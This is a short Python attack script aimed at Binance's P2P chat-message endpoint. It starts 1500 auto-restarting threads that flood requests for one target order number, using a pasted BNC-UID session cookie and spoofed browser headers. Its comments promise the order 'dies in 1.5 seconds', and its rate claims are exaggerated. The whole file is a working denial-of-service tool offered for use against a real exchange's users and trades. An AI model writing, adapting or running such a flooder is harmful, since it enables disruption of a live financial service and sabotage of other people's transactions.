import threading
import requests
import time
import random

# CHANGE THESE 2 LINES ONLY
ORDER_NO = "22811436844419928064"          # ← YOUR TARGET ORDER
BNC_UID  = "YOUR_30DAY_BNC_UID_HERE"       # ← PASTE YOUR BNC-UID HERE

URL = "https://p2p.binance.com/bapi/c2c/v2/friendly/c2c/order/chat-message-list"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36",
    "Accept": "application/json",
    "Referer": f"https://p2p.binance.com/en/trade/orderDetail?orderNo={ORDER_NO}",
    "Origin": "https://p2p.binance.com",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
}

COOKIES = {"BNC-UID": BNC_UID}

def kill():
    s = requests.Session()
    s.headers.update(HEADERS)
    s.cookies.update(COOKIES)
    while True:
        try:
            params = {
                "orderNo": ORDER_NO,
                "page": random.randint(1, 5),
                "rows": 50,
                "timestamp": int(time.time() * 1000) + random.randint(-5000, 5000)
            }
            r = s.get(URL, params=params, timeout=2)
            print(f"[KILL] {ORDER_NO} | OK | Threads: {threading.active_count()}")
            time.sleep(0.0004)  # 2500 req/sec per thread
        except:
            time.sleep(0.1)

# LAUNCH 1500 THREADS = 3.75 MILLION req/sec
print(f"NUCLEAR FLOOD STARTED → ORDER {ORDER_NO} DIES IN 1.5 SECONDS")
for i in range(1500):
    threading.Thread(target=kill, daemon=True).start()

# AUTO-RESTART + KEEP ALIVE
while True:
    active = threading.active_count()
    if active < 1200:
        print(f"[RESTART] Only {active} threads → spawning 500 more...")
        for i in range(500):
            threading.Thread(target=kill, daemon=True).start()
    print(f"[ALIVE] {ORDER_NO} STILL DEAD | Threads: {active}")
    time.sleep(30)
